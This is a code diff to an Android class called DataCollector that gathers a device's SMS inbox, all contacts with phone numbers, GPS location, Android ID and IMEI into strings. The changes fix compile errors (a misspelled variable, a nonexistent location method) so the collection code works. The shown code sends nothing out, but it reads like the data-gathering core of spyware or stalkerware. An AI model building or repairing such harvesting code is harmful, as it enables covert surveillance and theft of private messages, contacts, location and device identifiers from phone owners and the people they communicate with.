@@ -6,6 +6,7 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.provider.ContactsContract;
 import android.provider.Settings;
+import android.provider.Telephony;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
@@ -20,9 +21,9 @@ public class DataCollector {
     public String collectSMS() {
         try {
             ContentResolver contentResolver = context.getContentResolver();
-            Uri smsUri = android.provider.Telephony.Sms.Inbox.CONTENT_URI;
+            Uri smsUri = Telephony.Sms.Inbox.CONTENT_URI;
             Cursor cursor = contentResolver.query(smsUri, null, null, null, null);
-            
+
             StringBuilder sb = new StringBuilder();
             if (cursor != null) {
                 while (cursor.moveToNext()) {
@@ -46,12 +47,12 @@ public class DataCollector {
             ContentResolver contentResolver = context.getContentResolver();
             Uri contactUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
             Cursor cursor = contentResolver.query(contactUri, null, null, null, null);
-            
+
             StringBuilder sb = new StringBuilder();
             if (cursor != null) {
                 int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                 int phoneIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
-                
+
                 while (cursor.moveToNext()) {
                     String name = cursor.getString(nameIndex);
                     String phone = cursor.getString(phoneIndex);
@@ -68,13 +69,12 @@ public class DataCollector {
 
     public String collectLocation() {
         try {
-            android.location.LocationManager locationManager = 
+            android.location.LocationManager locationManager =
                 (android.location.LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
-            android.location.Location location = locationManager.getLastLocation(
-                android.location.Criteria.POWER_LOW);
-            
+            android.location.Location location = locationManager.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
+
             if (location != null) {
-                return String.format("{\"lat\":%.6f,\"lon\":%.6f}", 
+                return String.format("{\"lat\":%.6f,\"lon\":%.6f}",
                     location.getLatitude(), location.getLongitude());
             }
             return "";
@@ -85,10 +85,11 @@ public class DataCollector {
     }
 
     public String collectDeviceInfo() {
-        String deviceName = Settings.Secure.getString(context.getContentResolver(), 
+        String deviceName = Settings.Secure.getString(context.getContentResolver(),
             Settings.Secure.ANDROID_ID);
         String imei = ((TelephonyManager)context.getSystemService(android.telephony.TelephonyManager.class)).getDeviceId();
-        
-        return String.format("{\"device_id\":\"%s\",\"imei\":\"%s\"}", deviceName, imemi);
+
+        return String.format("{\"device_id\":\"%s\",\"imei\":\"%s\"}", deviceName, imei);
     }
 }
+
